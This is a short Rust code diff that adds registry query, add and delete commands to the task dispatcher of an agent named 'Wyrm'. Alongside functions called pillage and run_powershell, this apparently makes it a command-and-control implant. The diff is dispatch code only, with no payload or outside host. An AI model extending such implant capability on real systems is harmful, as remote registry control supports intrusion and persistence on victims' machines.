@@ -37,6 +37,7 @@ use crate::{
             pillage, pull_file,
         },
         processes::{kill_process, running_process_details},
+        registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
 };
@@ -265,6 +266,18 @@ impl Wyrm {
                             Some(WyrmResult::Err::<String>("Bad request.".into())),
                         );
                     }
+                }
+                Command::RegQuery => {
+                    let result = reg_query(&task.metadata);
+                    self.push_completed_task(&task, result);
+                }
+                Command::RegAdd => {
+                    let result = reg_add(&task.metadata);
+                    self.push_completed_task(&task, result);
+                }
+                Command::RegDelete => {
+                    let result = reg_del(&task.metadata);
+                    self.push_completed_task(&task, result);
                 }
             }
         }
